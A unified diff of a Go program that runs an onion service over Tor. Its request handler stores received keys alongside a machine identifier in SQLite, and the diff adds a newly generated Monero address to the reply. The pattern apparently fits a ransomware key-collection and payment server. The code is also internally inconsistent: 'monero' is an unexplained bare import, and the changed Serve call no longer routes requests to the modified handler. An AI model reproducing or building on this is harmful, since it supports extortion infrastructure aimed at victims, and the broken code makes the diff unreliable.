@@ -7,11 +7,12 @@ import (
 	"net/http"
 	"time"
 
+	"github.com/cretz/bine/process/embedded"
 	"github.com/cretz/bine/tor"
 
 	"database/sql"
+	"monero"
 
-	"github.com/gen2brain/go-libtor"
 	_ "github.com/mattn/go-sqlite3"
 )
 
@@ -22,38 +23,32 @@ func main() {
 }
 
 func run() error {
-	// Start tor with some defaults + elevated verbosity
-	fmt.Println("Starting and registering onion service, please wait a bit...")
-	t, err := tor.Start(context.TODO(), &tor.StartConf{ProcessCreator: libtor.Creator})
-	if err != nil {
-		log.Panicf("Failed to start tor: %v", err)
-	}
-	defer t.Close()
-
+	// Start tor with default config (can set start conf's DebugWriter to os.Stdout for debug logs)
+	fmt.Println("Starting and registering onion service, please wait a couple of minutes...")
+	t, err := tor.Start(nil, &tor.StartConf{ProcessCreator: embedded.NewCreator()})
 	if err != nil {
 		log.Panicf("Unable to start Tor: %v", err)
 	}
 	defer t.Close()
-
-	// Wait to publish Service
+	// Wait at most a few minutes to publish the service
 	listenCtx, listenCancel := context.WithTimeout(context.Background(), 3*time.Minute)
 	defer listenCancel()
-
-	// Listen
+	// Create a v3 onion service to listen on any port but show as 80
 	onion, err := t.Listen(listenCtx, &tor.ListenConf{Version3: true, RemotePorts: []int{80}})
 	if err != nil {
 		log.Panicf("Unable to create onion service: %v", err)
 	}
 	defer onion.Close()
-
-	fmt.Printf("Listening for POST request on http://%v.onion\n", onion.ID)
-
+	fmt.Printf("Open Tor browser and navigate to http://%v.onion\n", onion.ID)
+	fmt.Println("Press enter to exit")
 	// Serve the current folder from HTTP
 	errCh := make(chan error, 1)
-	http.HandleFunc("/", listener)
-	errCh <- http.Serve(onion, nil)
+	go func() { errCh <- http.Serve(onion, http.FileServer(http.Dir("."))) }()
 	// End when enter is pressed
-
+	go func() {
+		fmt.Scanln()
+		errCh <- nil
+	}()
 	if err = <-errCh; err != nil {
 		log.Panicf("Failed serving: %v", err)
 	}
@@ -77,6 +72,10 @@ func listener(w http.ResponseWriter, r *http.Request) {
 		fmt.Println(key)
 
 		writeDatabase(key, mac)
+
+		moneroKey := monero.NewKey()
+
+		fmt.Fprintf(w, "Key: %v\n", moneroKey.Address())
 
 	default:
 		fmt.Fprintf(w, "Tssss")
